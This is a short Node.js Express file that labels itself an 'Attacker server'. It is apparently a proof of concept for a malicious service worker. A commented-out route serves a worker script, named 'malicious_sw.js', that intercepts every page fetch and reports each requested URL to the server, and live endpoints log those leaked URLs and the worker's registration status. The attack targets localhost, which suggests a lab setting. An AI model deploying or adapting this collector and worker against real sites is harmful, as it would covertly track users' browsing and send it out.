const express = require('express');
const cors = require('cors'); // Add this line
const app = express();
const port = 3001;

app.use(cors()); // Add this line

// // Serve the malicious service worker
// app.get('/malicious_sw.js', (req, res) => {
//   res.setHeader('Content-Type', 'application/javascript');
//   res.send(`
//     self.addEventListener('fetch', function(e) {
//       e.respondWith(
//         caches.match(e.request).then(function(response) {
//           fetch('http://localhost:3001/fetch_url/' + e.request.url);
//           return response || fetch(e.request);
//         })
//       );
//     });
//   `);
// });

// Endpoint to log fetch requests
app.get('/fetch_url/:url', (req, res) => {
  console.log('Fetched URL:', req.params.url);
  res.send('Logged');
});

// Endpoint to log successful registration
app.get('/SW/success', (req, res) => {
  console.log('Service Worker registered successfully');
  res.send('SW registered');
});

// Endpoint to log failed registration
app.get('/SW/error', (req, res) => {
  console.log('Service Worker registration failed');
  res.send('SW registration failed');
});

app.listen(port, () => {
  console.log(`Attacker server listening at http://localhost:${port}`);
});
